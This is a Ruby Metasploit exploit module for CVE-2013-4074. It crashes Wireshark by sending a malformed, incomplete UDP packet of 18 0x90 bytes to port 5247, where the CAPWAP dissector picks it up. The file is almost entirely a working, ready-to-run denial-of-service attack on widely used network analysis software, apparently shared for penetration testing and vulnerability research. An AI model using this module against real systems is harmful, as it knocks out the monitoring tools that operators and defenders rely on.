#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

  Rank = GoodRanking

  include Msf::Exploit::Remote::Udp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wireshark CAPWAP dissector crash',
      'Description'    => %q{
          	This module inject malicious packet udp to crash wireshark. The crash is when we send 
		a incomplete packet and trigger capwap dissector. 
          )
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'j0sm1',  # Exploit and msf module
          'Laurent Butti' # Discovery vulnerability -> "Reported: 2013-05-28 23:38 UTC by Laurent Butti"
        ],
      'References'     =>
        [
          [ 'CVE', '2013-4074'],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'DisableNops' => 'True',
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Wireshark CAPWAP dissector CRASH',
            {
            }
          ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Apr 28 2014',
      'DefaultTarget'  => 0))

   # Protocol capwap needs port 5247 to trigger the dissector in wireshark
   register_options([ Opt::RPORT(5247) ], self.class)

  end

  def exploit

    connect_udp

    # We send a packet incomplete to crash dissector
    print_status("#{rhost}:#{rport} - Trying to exploit #{target.name}...")
    buf = "\x90" * 18
    udp_sock.put(buf)

    disconnect_udp

  end
end
